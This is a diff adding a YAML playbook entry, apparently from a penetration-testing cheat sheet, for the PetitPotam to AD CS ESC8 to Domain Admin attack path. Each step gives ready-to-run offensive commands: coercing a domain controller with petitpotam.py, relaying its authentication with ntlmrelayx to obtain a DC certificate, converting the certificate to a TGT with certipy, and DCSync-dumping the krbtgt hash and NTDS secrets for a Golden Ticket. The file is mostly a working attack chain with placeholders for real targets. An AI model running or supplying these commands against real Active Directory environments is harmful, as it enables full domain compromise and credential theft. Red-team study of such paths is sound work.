@@ -1,0 +1,37 @@
+title: PetitPotam → ADCS ESC8 → Domain Admin
+category: AD / Attack paths
+order: 10
+summary: >
+  Unauthenticated (or low-priv) path: coerce a DC to authenticate, relay it to
+  the AD CS web enrollment, obtain a certificate for the DC account, then use it
+  to DCSync. Classic when an HTTP CA endpoint has no EPA.
+tags: [petitpotam, adcs, esc8, relay, coercion, dcsync]
+steps:
+  - title: Find a CA web enrollment endpoint
+    detail: ESC8 needs the HTTP(S) enrollment interface reachable and NTLM-authenticated.
+    commands:
+      - "certipy find -u $user@$domain -p $password -dc-ip $dc_ip -stdout -vulnerable"
+      - "curl -s http://$dc_host/certsrv/ -I"
+    gains: ["CA host + template names"]
+  - title: Start the relay to the CA
+    detail: Target the enrollment ASP endpoint; request a DC-capable template.
+    commands:
+      - "ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+    needs: ["Reachable CA HTTP endpoint without EPA"]
+  - title: Coerce the DC to authenticate to you
+    detail: Force DC$ to authenticate to $attacker_ip so the relay captures it.
+    commands:
+      - "petitpotam.py -u $user -p $password -d $domain $attacker_ip $dc_host"
+      - "# alt vectors: printerbug.py / dfscoerce.py / coercer coerce"
+    gains: ["Base64 certificate for $dc_host machine account"]
+  - title: Turn the cert into a TGT
+    detail: PKINIT with the DC certificate → TGT for the DC account.
+    commands:
+      - "certipy auth -pfx dc.pfx -dc-ip $dc_ip"
+    gains: ["TGT + NT hash of $dc_host$"]
+  - title: DCSync
+    detail: With the DC machine account you can replicate secrets.
+    commands:
+      - "secretsdump.py -k -no-pass $dc_host -just-dc-user $domain_nb/krbtgt"
+      - "netexec smb $dc_ip -k --ntds"
+    gains: ["krbtgt hash → Golden Ticket / full domain compromise"]
